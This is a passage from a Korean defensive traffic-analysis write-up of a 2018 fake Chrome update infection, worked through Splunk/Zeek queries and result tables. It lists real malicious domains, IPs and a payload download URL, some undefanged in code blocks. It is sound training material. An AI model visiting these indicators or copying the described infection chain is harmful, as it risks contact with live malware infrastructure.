---
title: Sorting through the alerts — 해킹된 교회 사이트에서 가짜 Chrome 업데이트, WScript C2, 349 KB 페이로드, 실패한 후속 C2까지 (Splunk 중심, Arkime 보조)
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - cyberchef
  - snort
  - socgholish
  - fake-update
  - c2
---

# Sorting through the alerts — 가짜 Chrome 업데이트에서 WScript C2와 후속 C2 시도까지 { #sorting-alerts }

!!! abstract "사례 요약"
    malware-traffic-analysis.net의 **2018-06-30 "Sorting through the alerts" 실습**을 홈 랩 **pcapbox** VM에서 한 단계씩 분석한 기록이에요. 주 도구는 **Splunk**(Zeek 로그)이고, **Splunk로 볼 수 없는 것(페이지 내용, POST 본문)만 Arkime**로 봐요. 윈도우 7 PC 한 대(**CONSERVATOR-PC, 사용자 lloyd.maxwell**)가 **해킹된 교회 웹사이트**를 열어요. 사이트에 숨겨진 스크립트가 브라우저를 **지문 검사 리다이렉터**(TDS)를 거쳐 **가짜 "Update Chrome" 페이지**로 보내고, 그 페이지가 **Dropbox에서 `Chrome_72.3.22.js`**를 내려받게 해요. 46초 뒤 사용자가 그 파일을 실행해요. `wscript.exe`가 C2에 **XOR로 감춘 POST 3개**(호스트, 사용자, 도메인, 프로세스 목록)를 보내고 **349 KB 인코딩된 페이로드**를 받아 `%TEMP%`의 `Chrome_72.3.22.exe`로 보고해요. 10초 뒤부터 PC는 **하드코딩된 C2 IP 두 곳**에 약 7.5분마다 접속을 시도해요. **한 곳은 거절하고 한 곳은 대답이 없어요.** 간단한 Snort 룰 하나와 짧은 보고서로 마무리해요.

| | |
|---|---|
| **증거** | `2018-06-30-traffic-analysis-exercise.pcap` — 2018-06-30 20:27:15 – 20:59:06 UTC (31.9분) |
| **출처** | [malware-traffic-analysis.net 2018-06-30 "Sorting through the alerts"](https://malware-traffic-analysis.net/2018/06/30/index.html) |
| **주어진 정보** | LAN 172.16.2.0/24, DC 172.16.2.9, 도메인 fabulousdukes.com |
| **환경** | 폐쇄망. pcapbox VM: Splunk(`index=zeek`, 케이스 필드 `pcap_case`), Arkime(태그 = 케이스 이름), Snort 2.9.20, CyberChef. **Wireshark 사용 안 함.** |
| **케이스 이름** | `20180630_SORTING_THROUGH_THE_ALERTS` |
| **결과물** | 분석, 풀어 낸 다운로드 URL과 C2 본문, Snort 룰 하나 |
| **관련 페이지** | [Night Dew 두 번째 분석(pcapbox, Snort 테스트 가이드)](night-dew-arkime-splunk-netlogon-bruteforce.md) · [BEGUILESOFT(Splunk 중심 베이스라이닝)](beguilesoft-hawkeye-ftp-exfil.md) · [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [Zeek 로그](../../network/zeek/index.md) |

!!! tip "이 페이지 읽는 법"
    실제로 분석한 순서 그대로예요. 결과 블록은 모두 분석자의 Splunk나 Arkime에 실제로 나온 값이에요. 단계마다 **목적 → Splunk → Arkime(Splunk로 안 보일 때만) → 결과 → 결과 읽기** 순서예요. SPL 쿼리는 모두 한 줄씩 설명해요. **질문** 상자는 분석하면서 나온 질문과 답이에요.

    중요한 곳에는 이렇게 표시해요. **[데이터]** = Splunk나 Arkime에서 본 것, **[추측]** = 데이터로 짐작했지만 아직 증명이 필요한 것.

!!! warning "이 페이지의 지표는 실제 값이에요"
    도메인, IP, 해시는 2018년 실제 악성 트래픽에서 나온 값이에요. 본문과 표에서는 무력화(`hxxp`, `[.]`)했고, 코드 블록 안은 입력한 그대로예요. **절대 접속하지 마세요.** 추출한 것은 실행하지 마세요.

## 한눈에 보는 답 { #answers }

| 항목 | 답 | 상태 |
|---|---|---|
| 감염된 PC | **172.16.2.169, CONSERVATOR-PC**, 윈도우 7 x64 | 확인(Kerberos, NTLM, DNS) |
| 사용자 | **lloyd.maxwell** (도메인 FABULOUSDUKES) | 확인 |
| DC | 172.16.2.9, FABULOUSDUKE-DC | 확인 |
| 첫 악성 이벤트 | **20:27:53 UTC** — 해킹된 사이트 `www.stmarybahrain[.]com`(66.226.144.232) 방문, Referer 없음 | 확인 |
| 리다이렉트 경로 | 사이트 스크립트 → `track.positiverefreshment[.]org/s_code.js`(185.244.149.74, 브라우저 지문) → 가짜 페이지 `lw2e.sineadhollywoodnutt[.]com/topics/index.php`(93.95.100.178) | 확인 |
| 다운로드 | 20:28:00–01 `hxxps://www.dropbox[.]com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1`, 약 23 KB 받음 | URL 해독 확인, SNI와 시간으로 다운로드 증명, 내용은 안 보임(HTTPS) |
| 실행 | 20:28:47 — `wscript.exe`가 `bb17eb22.login3.kimbrelelectric[.]com/blank.gif`(93.95.100.138)로 POST | 확인(`b=` 본문에 스크립트 경로와 `wscript.exe`) |
| 보낸 정보 | 스크립트 경로, 호스트, 사용자, 도메인, 백신, 화면, 프로세스 목록 | 확인(해독) |
| 페이로드 | 349 KB hex 응답 → `C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe`로 보고 | 경로 확인, 실행은 이후 트래픽으로 추정 |
| 후속 C2 | 46.105.131.66:443(거절), 107.170.231.118:4143(대답 없음), 끝날 때까지 약 7.5분마다 | 확인 — **C2 연결은 한 번도 성공 안 함** |
| 계열 | SocGholish 유형 가짜 업데이트, 후속 동작은 Dridex와 비슷 | 확인 안 됨(해시·시그니처 없음) |

---

## 0단계 — PCAP 넣고 케이스 확인 { #prep }

**목적:** PCAP에 **케이스 이름**을 붙여서 다른 실습 로그와 섞이지 않게 하고, 모든 도구가 **UTC**로 보이게 해요.

1. 파일 이름을 **`20180630_SORTING_THROUGH_THE_ALERTS.pcap`**으로 바꾸고 `\\10.50.10.60\incoming`에 넣어요.
2. pcapbox에서 `tail -f /data/logs/ingest.log`를 보다가 `DONE case=20180630_SORTING_THROUGH_THE_ALERTS`가 나오면 끝이에요.
3. Splunk **Preferences → Time zone = UTC**, Arkime **Settings → Timezone = UTC**, 시간 범위 **All**.

```spl
index=zeek sourcetype=zeek:conn
| stats count by pcap_case
```

- `index=zeek` — Zeek 로그가 든 인덱스(Splunk의 "서랍")만 봐요.
- `sourcetype=zeek:conn` — 연결 로그예요. 연결 하나가 한 줄이에요.
- `|` — 왼쪽 결과를 다음 명령으로 넘겨요.
- `stats count by pcap_case` — 케이스 이름마다 줄 수를 세요.

!!! note "`_time`이 아니라 `ts`"
    Zeek의 이벤트 시간은 **`ts`**(epoch 초)예요. 이 페이지의 쿼리는 모두 `ts`로 정렬하고 출력해요. 그러면 `_time`이 색인 시각으로 찍히는 Splunk에서도 맞게 나와요. `eval t=strftime(ts,"%H:%M:%S")`로 읽기 쉽게 바꿔요.

!!! tip "케이스 이름이 길 때"
    Splunk에서는 `pcap_case=20180630_SORTING*`처럼 `*`(아무 글자)를 써도 돼요. 다른 케이스와 겹치지 않을 때만요. Arkime의 `tags ==`에는 전체 이름을 써요.

---

## 1단계 — 베이스라이닝 { #baseline }

베이스라이닝 = 나쁜 것을 찾기 전에 이 캡처의 **평소 모습**을 먼저 아는 거예요. 시간 범위, 로그 종류, 내부 PC, 얼마나 바쁜지, 누구인지를 봐요.

### 1-1. 어떤 로그가 있나 { #log-types }

```spl
index=zeek pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| stats count by sourcetype
| sort - count
```

- `sourcetype`을 안 적어서 이 케이스의 **모든 로그 종류**를 가져와요. `sort - count` = 많은 순서(`-`는 내림차순).

```text
sourcetype          count
zeek:conn           729
zeek:dns            313
zeek:ssl            265
zeek:files          176
zeek:x509           171
zeek:http           134
zeek:ocsp           72
zeek:kerberos       37
zeek:ldap_search    21
zeek:dce_rpc        18
zeek:ldap           13
zeek:weird          7
zeek:smb_mapping    6
zeek:software       5
zeek:ntp            4
zeek:smb_files      2
zeek:ntlm           1
```

**[데이터] 결과 읽기:**

- **`zeek:dhcp`가 없어요.** 캡처가 시작될 때 PC가 이미 IP를 갖고 있었다는 뜻이에요. 호스트 이름은 다른 곳에서 찾아야 해요(1-5).
- **웹 로그가 가장 많아요**(`ssl` 265, `http` 134). 누군가 웹을 보고 있었어요. HTTPS가 HTTP의 두 배지만, **HTTP 134개는 내용을 다 볼 수 있어서** 핵심 재료가 돼요.
- **도메인 로그**(`kerberos`, `ldap`, `dce_rpc`, `smb_*`, `ntlm`) = AD PC가 DC와 하는 평소 대화예요(로그온, 그룹 정책). 사용자와 컴퓨터 이름이 여기 있어요.
- `ocsp`(인증서 확인), `ntp`(시간), `weird`(이상한 패킷)는 보통 별일 아니에요. `software`는 Zeek가 알아본 프로그램 목록이에요(1-5에서 써요).

### 1-2. 캡처 시간 범위 { #window }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| stats min(ts) as first max(ts) as last count as sessions
| eval duration_min=round((last-first)/60,1)
| eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
```

- 2줄: 전체를 한 줄로 요약해요 — 가장 이른 시간, 가장 늦은 시간, 연결 수. `as`는 결과에 이름을 붙여요.
- 3줄: `eval`로 새 필드를 계산해요. 분 단위, 소수 한 자리.
- 4줄: epoch → 읽을 수 있는 날짜. **3줄이 4줄보다 먼저**여야 해요. 4줄을 지나면 `first`, `last`가 글자가 돼서 뺄셈을 못 해요.

```text
first                 last                  sessions  duration_min
2018-06-30 20:27:15   2018-06-30 20:59:06   729       31.9
```

### 1-3. 어떤 내부 IP가 연결을 시작하나 { #internal-hosts }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first max(ts) as last by id_orig_h
| eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S")
| sort - sessions
```

- `id_orig_h` = 연결을 **시작한** IP예요(`orig` = 시작한 쪽, `resp` = 받은 쪽, `_h` = IP, `_p` = 포트).
- `dc()` = 중복 빼고 세기. `orig_bytes` / `resp_bytes` = 양쪽이 보낸 데이터 바이트.

```text
id_orig_h      sessions  destinations  sent     received   first     last
172.16.2.169   729       184           845926   34269192   20:27:15  20:59:06
```

**[데이터] 결과 읽기:**

- **PC는 한 대예요.** DC는 안 나와요. Zeek는 DC의 NetBIOS 응답을 PC가 시작한 연결 안에 넣어요(UDP도 먼저 보낸 쪽이 `orig`예요).
- **32분 동안 목적지 184곳** — 비콘이라면 1~3곳이에요. 이건 **사람이 웹을 본 모습**이에요(뉴스 페이지 하나가 광고·CDN을 수십 곳 불러요). 그래서 "많이 통신한 곳"으로는 악성코드를 못 찾아요. **정상을 지우고 남는 것을 보는** 방법으로 가요.
- 받은 양 ≫ 보낸 양(34 MB 대 0.85 MB) — PC의 정상 모습이에요. 반대면 유출을 의심해요.

### 1-4. Arkime 교차 확인 { #arkime-baseline }

```text
tags == 20180630_SORTING_THROUGH_THE_ALERTS
```

**세션 654개**예요(Zeek 729 — 두 도구가 UDP와 재시도 연결을 나누는 방식이 달라요. 큰 그림은 같아요). **SPIView → General → Src IP / Dst IP**에 PC 한 대와 긴 목적지 목록이 보여요.

**Databytes / Bytes 읽는 법:** 윗줄은 **데이터**(페이로드), 아랫줄은 헤더까지 포함한 전체 바이트예요. **Databytes 0** = 연결 신호만 오가고 데이터는 없음.

**[데이터] 모양이 다른 줄 — 메모만, 결론은 아직:**

| 목적지 | 모양 |
|---|---|
| `46.105.131.66:443` | 출발 포트마다 세션 여러 개, 패킷 2개씩, **Databytes 0**, 몇 분마다 반복 |
| `107.170.231.118:4143` | 패킷 3개, **Databytes 0**, 흔하지 않은 포트, 몇 분마다 반복 |

나머지는 DC와의 평소 통신(53 DNS, 88 Kerberos, 123 NTP, 389 LDAP, 445 SMB, 137/138 NetBIOS, 5355 LLMNR `wpad`, 1900 SSDP)과 `crl.microsoft.com`이에요.

### 1-5. 172.16.2.169는 누구인가 { #identity }

DHCP가 없으니 윈도우가 자기 이름을 말하는 다른 곳을 봐요.

**① Kerberos**

```spl
index=zeek sourcetype=zeek:kerberos pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count values(request_type) as types values(success) as success values(error_msg) as errors by client
| sort first
```

- `client` = `계정/영역(REALM)`. `values()` = 서로 다른 값 전부. `request_type`: **AS** = 로그온 티켓(TGT), **TGS** = 서비스 티켓, **AP** = 받은 티켓을 서비스에 내미는 단계.

```text
client                              first     count  types    success      errors
/FABULOUSDUKES.COM                  20:27:17  13     AP       true
CONSERVATOR-PC$/FABULOUSDUKES.COM   20:27:17  11     AS TGS   false true   KDC_ERR_PREAUTH_REQUIRED
conservator-pc$/FABULOUSDUKES.COM   20:27:17  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
lloyd.maxwell/FABULOUSDUKES         20:27:18  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
lloyd.maxwell/FABULOUSDUKES.COM     20:27:18  5      TGS      true
conservator-pc$/fabulousdukes.com   20:27:44  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
```

| 보이는 것 | 뜻 |
|---|---|
| 이름이 `$`로 끝남 | **컴퓨터 계정** → 호스트 이름 **CONSERVATOR-PC** |
| `$` 없음 | **사용자** → **lloyd.maxwell**, 20:27:18 로그온 |
| 계정 이름이 빈 줄(`/FABULOUSDUKES.COM`, AP) | AP 요청은 이름이 암호화된 부분 안에 있어서 Zeek가 못 보여 줘요. 정상 |
| 같은 계정이 대소문자·REALM만 다름 | 윈도우가 일정하지 않을 뿐 같은 계정 |
| `KDC_ERR_PREAUTH_REQUIRED` 뒤 성공 | 정상적인 사전 인증. 비밀번호가 틀리면 `KDC_ERR_PREAUTH_FAILED` — 여기엔 없음 |

**② NTLM**

```spl
index=zeek sourcetype=zeek:ntlm pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| table t id_orig_h id_resp_h id_resp_p username hostname domainname server_nb_computer_name success
```

```text
t         id_orig_h     id_resp_h   id_resp_p  username          hostname         domainname     server_nb_computer_name  success
20:27:35  172.16.2.169  172.16.2.9  445        CONSERVATOR-PC$   CONSERVATOR-PC   FABULOUSDUKES  FABULOUSDUKE-DC          true
```

PC가 켜질 때 컴퓨터 계정이 DC의 SMB 공유(그룹 정책)에 로그온한 거예요. DC 이름도 나와요: **FABULOUSDUKE-DC**.

**③ DNS 동적 업데이트**

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS qtype_name=SOA
| eval t=strftime(ts,"%H:%M:%S")
| table t id_orig_h id_resp_h query qtype_name rcode_name
```

```text
t         id_orig_h     id_resp_h   query                              qtype_name  rcode_name
20:37:03  172.16.2.169  172.16.2.9  conservator-pc.fabulousdukes.com   SOA         NOERROR
20:27:16  172.16.2.169  172.16.2.9  conservator-pc.fabulousdukes.com   SOA         NOERROR
```

도메인 PC는 자기 이름을 DC에 등록해요. 등록 전에 `SOA` 질의를 먼저 보내요. 정확히 10분 간격 — 윈도우의 주기적 재등록이에요. 세 곳이 모두 **CONSERVATOR-PC / fabulousdukes.com**으로 같아요.

**④ software**

```spl
index=zeek sourcetype=zeek:software pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| table t host software_type name unparsed_version
```

```text
t         host          software_type   name                  unparsed_version
20:43:13  172.16.2.169  OS::WINDOWS     Windows
20:33:54  172.16.2.169  HTTP::BROWSER   Microsoft BITS        Microsoft BITS/7.5
20:28:47  172.16.2.169  HTTP::BROWSER   MSIE                  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; ...)
20:28:00  172.16.2.169  HTTP::BROWSER   Microsoft-CryptoAPI   Microsoft-CryptoAPI/6.1
20:27:53  172.16.2.169  HTTP::BROWSER   Chrome                Mozilla/5.0 (Windows NT 6.1; Win64; x64) ... Chrome/67.0.3396.99 Safari/537.36
```

- Zeek는 알아본 프로그램을 한 번씩 적어요. `Windows NT 6.1` = 윈도우 7, `Win64; x64` = 64비트.
- 사용자의 브라우저는 **Chrome 67**(20:27:53)이에요. BITS(윈도우 다운로드)와 CryptoAPI(인증서 확인)는 윈도우 자체예요.
- **[데이터] 54초 뒤 "MSIE 7.0"이라고 말하는 프로그램**이 나와요. 2006년 브라우저예요. 윈도우 7에서 `Trident/7.0`(IE11 엔진)과 함께 나오면 **스크립트가 쓰는 윈도우 HTTP 객체**(wscript, 오피스 매크로 등)의 기본 User-Agent예요. 후보로 메모해요.

**베이스라인 메모 — 후보 3개, 결론은 아직:**

1. `46.105.131.66:443` — 데이터 없음, 반복
2. `107.170.231.118:4143` — 데이터 없음, 흔하지 않은 포트, 반복
3. 20:28:47 `MSIE 7.0` — 사용자 브라우저가 아닌 프로그램

---

## 2단계 — 외부 목적지: 정상을 지우고 남는 것 보기 { #destinations }

### 2-1. 포트별로 { #ports }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4
| stats count dc(id_resp_h) as ips values(service) as service values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by proto id_resp_p
| sort - count
```

- `NOT id_resp_h=172.16.0.0/12` — Splunk는 IP 필드에 대역(CIDR)을 쓰면 알아서 맞춰 봐요. 내부 주소를 빼요. `224.0.0.0/4`는 멀티캐스트를 빼요.
- `service` = Zeek가 내용으로 알아본 프로토콜. 비어 있으면 Zeek도 몰랐다는 뜻.
- `conn_state`: **SF** 정상 시작·종료 · **S0** SYN에 대답 없음 · **REJ** SYN에 RST(거절) · **RSTO/RSTR** PC/서버가 강제 종료 · **SH/OTH** 일부만 보임(캡처 시작·끝에서 흔함).

```text
proto  id_resp_p  count  ips  service  states                          sent    received
tcp    443        364    163  ssl      OTH REJ RSTO RSTR S1 SF         642014  5667734
tcp    80         27     14   http     RSTO SF                         58106   28337141
tcp    4143       16     1             S0                              0       0
udp    443        10     6             SF                              45454   174932
```

**[데이터] 결과 읽기:**

- tcp/443: HTTPS 브라우징. 그런데 **REJ**가 섞여 있어요(2-3에서 정체가 나와요).
- tcp/80: **28 MB** 받음 — 3-1에서 구글의 BITS 다운로드로 확인돼요.
- **tcp/4143: IP 한 곳, service 없음, S0만, 0바이트.** 흔하지 않은 포트, 대답 한 번도 없음.
- udp/443에 service가 없는 건 **QUIC**이에요(구글이 만든 UDP HTTPS, Chrome이 써요). Zeek의 QUIC 분석기가 꺼져 있어서 비어 있어요. 정상이에요.

### 2-2. 도메인별로 { #domains }

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT query="*fabulousdukes.com"
| rex field=query "(?<domain>[^.]+\.[^.]+)$"
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count dc(query) as names values(query) as examples by domain
| eval examples=mvindex(examples,0,2)
| sort first
```

- `rex`는 정규식으로 값의 일부를 잘라 새 필드를 만들어요. `(?<domain> … )` = 걸린 부분의 이름, `[^.]+` = 점이 아닌 글자들, `\.` = 진짜 점, `$` = 끝. 결과는 맨 끝 두 이름이에요(`r4---sn-p5qs7nek.gvt1.com` → `gvt1.com`).
- `mvindex(목록,0,2)` = 앞의 세 값만 남겨요(0부터 세요).

도메인 116개가 나왔어요. **정상을 지우는 방법:**

1. 잘 아는 회사: microsoft, google, googleapis, bing, facebook, twitter, yahoo, cloudfront, windows.net.
2. **CNN 묶음:** `cnn.com`이 20:27:52, 바로 뒤 20:27:53~20:28:03에 광고·추적 도메인 수십 개(optimizely, doubleclick, outbrain, rubiconproject, pubmatic, criteo …). 이름에 *ad, pixel, sync, match, track, cdn, beacon*이 있으면 대부분 광고 기술이에요.
3. 윈도우 자체: `gvt1.com`(BITS), `digicert.com`, `_tcp.local`(크롬캐스트 찾기).

**[데이터] 남는 것(시간 순서):**

| 처음 | 도메인 | 메모 |
|---|---|---|
| 20:27:52 | **stmarybahrain.com** (`www.`) | 교회 사이트, CNN과 같은 초 |
| 20:27:54 | **positiverefreshment.org** (`track.`) | 광고 회사도 아닌데 "track" |
| 20:27:56 | **sineadhollywoodnutt.com** (`lw2e.`) | 사람 이름 같은 도메인, 아무렇게나 만든 듯한 하위 이름 |
| 20:27:59 | dropbox.com | 정상 서비스지만 **파일 다운로드**용 |
| 20:28:00 | dropboxusercontent.com (`uc7cfbc6f….dl.`) | Dropbox 파일 서버 |
| 20:28:24 | summerhamster.com | 이상한 이름 — 질문 상자 참고 |
| 20:28:46 | **kimbrelelectric.com** (`bb17eb22.login3.`) | 전기 회사 이름인데 하위 이름이 만든 것 같은 모양 |

!!! question "질문: summerhamster.com은 왜 남기지 않나요?"
    DNS 답이 광고 회사 서버 `bc.sp-prod.net`을 가리키는 **CNAME**(별명)이고, Chrome이 HTTPS로 한 번 접속했어요. 다른 광고 도메인과 같은 모양이에요. **CNAME을 따라가 보는 것**도 정상을 지우는 방법이에요.

    ```spl
    index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS query="www.summerhamster.com"
    | table ts query answers
    ```

### 2-3. DNS 없이 간 목적지 { #no-dns }

사람은 이름으로 웹을 봐요. **이름을 찾은 적 없는 IP**로 간 연결은 프로그램 안에 박힌 주소일 수 있어요.

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4
    NOT [search index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h]
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first max(t) as last count values(id_resp_p) as ports values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h
| sort first
```

- `[ … ]` **서브서치**가 먼저 실행돼요. DNS 답에 나온 모든 IP를 모아요(`mvexpand` = 값이 여러 개인 필드를 값 하나당 한 줄로 펼치기, `rename` = conn 필드 이름과 맞추기). 결과는 `(id_resp_h="a" OR id_resp_h="b" …)`가 되고, `NOT`이 붙어서 **DNS 답에 한 번도 안 나온 IP만** 남아요.
- 주의: 캡처 **전에** 이름을 찾아 둔 IP도 여기 나와요. 캡처 시작 무렵에 나오는 IP는 그럴 수 있어요.

```text
id_resp_h         first     last      count  ports  states  sent  received
46.105.131.66     20:29:00  20:59:06  30     443    REJ     0     0
107.170.231.118   20:31:14  20:53:51  16     4143   S0      0     0
```

**[데이터] 결과 읽기:** 184곳 중 **두 곳만** 남았고, 베이스라인 후보 1, 2와 정확히 같아요. 2-1의 tcp/443 REJ가 46.105.131.66이에요. 443 포트지만 HTTPS가 아니고 매번 거절당했어요. 캡처 시작 2분쯤 뒤에 처음 나와서 30분 동안 반복돼요 — **사람이 아니라 프로그램**이에요. 20:29:00은 후보 3(`MSIE 7.0`, 20:28:47)과 **13초** 차이예요.

**지금까지의 단서(시간 순서):** 교회 사이트(20:27:52) → `track.`(20:27:54) → `lw2e.`(20:27:56) → Dropbox 파일 서버(20:28:00) → `kimbrelelectric`(20:28:46) → `MSIE 7.0`(20:28:47) → DNS 없는 IP 시도(20:29:00). **[추측]** 사이트 방문 → 다운로드 → 브라우저가 아닌 무언가가 kimbrelelectric과 통신 → 하드코딩된 IP. 3단계에서 HTTP로 확인해요.

---

## 3단계 — HTTP: 교회 웹사이트에서 가짜 Chrome 업데이트까지 { #http }

### 3-1. 호스트별 HTTP { #http-hosts }

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats count min(t) as first values(method) as methods values(user_agent) as user_agents sum(response_body_len) as received by host
| sort first
```

- `host` = HTTP Host 헤더. `method`: GET 가져오기, POST 보내기, HEAD 헤더만.
- `mvdedup(host)` — 아래 상자에서 설명해요.

!!! question "질문: 숫자가 두 배로 나왔어요. 왜 그렇고, 근본적으로 고칠 수 있나요?"
    처음 실행했을 때 `count` 합계가 268인데 이벤트는 134개였어요. 결과의 `host`에 **같은 값이 두 개**였어요: `["www.stmarybahrain.com","www.stmarybahrain.com"]`.

    pcapbox는 색인할 때 Zeek JSON의 `"host"` 키를 Splunk의 기본 `host` 필드에 넣어요(`host="…"` 검색을 빠르게 하려고요). 검색할 때 `KV_MODE = json`이 같은 키를 한 번 더 뽑아서 기존 `host`에 **덧붙여요**. Zeek의 키 이름이 Splunk의 예약 필드 이름과 겹친 거예요. `stats … by host`는 값마다 한 번씩 세서 모든 이벤트를 두 번 셌어요. `zeek:software`(키 `host` = IP)도 같았어요.

    - **쿼리에서:** `| eval host=mvdedup(host)` — 중복된 값을 지워요.
    - **근본 해결(pcapbox):** `/opt/splunk/etc/apps/pcapbox/local/props.conf`의 검색용 구역 `[source::/data/zeek/...]`에 계산 필드를 넣고 Splunk를 재시작해요.

        ```text
        EVAL-host = mvdedup(host)
        ```

        계산 필드는 JSON 추출 **뒤에** 실행돼서 매 검색마다 중복을 지워요. 이미 넣은 데이터에도 적용되고 재색인이 필요 없어요. 확인: `… | eval n=mvcount(host) | stats count by n`에 `n=1`만 나와야 해요.
    - 설정을 못 바꾸는 팀 Splunk에서는 `mvdedup`을 쿼리에 넣는 습관을 유지해요. 중복이 없는 곳에서도 해가 없어요.

```text
host                                   count  first     methods    user_agents                              received
www.stmarybahrain.com                  52     20:27:53  GET        Mozilla/5.0 ... Chrome/67.0.3396.99 ...  1220096
track.positiverefreshment.org          3      20:27:55  GET        Mozilla/5.0 ... Chrome/67.0.3396.99 ...  10001
lw2e.sineadhollywoodnutt.com           9      20:27:57  GET        Mozilla/5.0 ... Chrome/67.0.3396.99 ...  321733
ocsp.digicert.com                      1      20:28:00  GET        Microsoft-CryptoAPI/6.1                  471
bb17eb22.login3.kimbrelelectric.com    3      20:28:47  POST       Mozilla/4.0 (compatible; MSIE 7.0; ...)  360734
r4---sn-p5qs7nek.gvt1.com              15     20:33:54  GET HEAD   Microsoft BITS/7.5                       13046157
redirector.gvt1.com                    32     20:33:54  GET HEAD   Microsoft BITS/7.5                       11101
... (gvt1.com 호스트 6개 더, BITS)
crl.microsoft.com                      2      20:43:13  GET        Microsoft-CryptoAPI/6.1                  1012
```

**[데이터] 결과 읽기:**

- tcp/80의 28 MB는 20:33:54부터 **구글 다운로드 서버(`gvt1.com`)에서 받은 BITS 다운로드**예요. 윈도우 백그라운드 다운로드라 정상이에요.
- 1-5와 짝이 맞아요. Chrome → 교회 사이트, `track.`, `lw2e.` / CryptoAPI → 인증서 서버 / BITS → 구글.
- **`MSIE 7.0` → kimbrelelectric.com 한 곳, POST만 3번**, 약 360 KB 받음. 웹을 볼 때는 GET이 대부분이에요. 브라우저가 아닌 프로그램이 **데이터를 보내고 많이 받아 갔어요**.

### 3-2. 누가 브라우저를 어디로 보냈나 — Referer 사슬 { #referer }

**Referer** 헤더는 "나는 이 페이지에서 왔어요"라는 뜻이에요. 따라가면 어떤 페이지가 무엇을 불렀는지 이어져요. (HTTP 철자는 *Referer*, Zeek 필드 이름은 `referrer`예요.)

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS host IN ("www.stmarybahrain.com","track.positiverefreshment.org","lw2e.sineadhollywoodnutt.com")
| eval t=strftime(ts,"%H:%M:%S.%3N")
| search NOT uri="*.jpg*" NOT uri="*.png*" NOT uri="*.gif*" NOT uri="*.css*"
| sort ts
| table t host uri referrer status_code resp_mime_types response_body_len
```

- `host IN ("a","b")` = `host="a" OR host="b"`. `%3N` = 밀리초. `search NOT …` 줄은 이미지와 스타일 파일을 숨겨요.
- `status_code`: 200 성공, 301/302 이동, 404 없음. `resp_mime_types` = Zeek가 **내용을 보고** 추측한 형식.

```text
t              host                            uri                                                         referrer                             status  mime                     len
20:27:53.623   www.stmarybahrain.com           /                                                           -                                    200     text/html                155
20:27:53.765   www.stmarybahrain.com           /new                                                        http://www.stmarybahrain.com/        301     text/html                241
20:27:53.892   www.stmarybahrain.com           /new/                                                       http://www.stmarybahrain.com/        200     text/html                31295
20:27:54.629   www.stmarybahrain.com           /new/media/system/js/mootools.js                            http://www.stmarybahrain.com/new/    200     text/plain               75192
...            (caption.js, ext-core.js, menu.min.js, md_stylechanger.js, jquery.js [application/javascript], s3Slider.js)
20:27:55.731   track.positiverefreshment.org   /s_code.js?cid=220&v=24eca7c911f5e102e2ba                   http://www.stmarybahrain.com/new/    200     application/javascript   2761
20:27:56.081   track.positiverefreshment.org   /s_code.js?cid=220&v=77e997b1…&rand=…&key=…&0=0&1=&2=16       http://www.stmarybahrain.com/new/    200     application/javascript   4911
20:27:56.468   track.positiverefreshment.org   /s_code.js?cid=220&v=5f210213…&0=Mozilla&1=Netscape&2=5.0 (Windows NT 6.1; …)…   http://www.stmarybahrain.com/new/   200   application/javascript   2329
20:27:57.029   lw2e.sineadhollywoodnutt.com    /topics/index.php?s=775118&b=220&a=88a209071dc04d3568f791712c740240   http://www.stmarybahrain.com/new/   200   application/javascript   4399
20:27:58.485   lw2e.sineadhollywoodnutt.com    /chromefiles/k3k702ZOKiLJc3WVjuplzOgdm0LZdjqr5-oayXSOefg.woff2   http://lw2e.sineadhollywoodnutt.com/chromefiles/css.css   200   application/font-woff2   16276
```

**[데이터] 결과 읽기:**

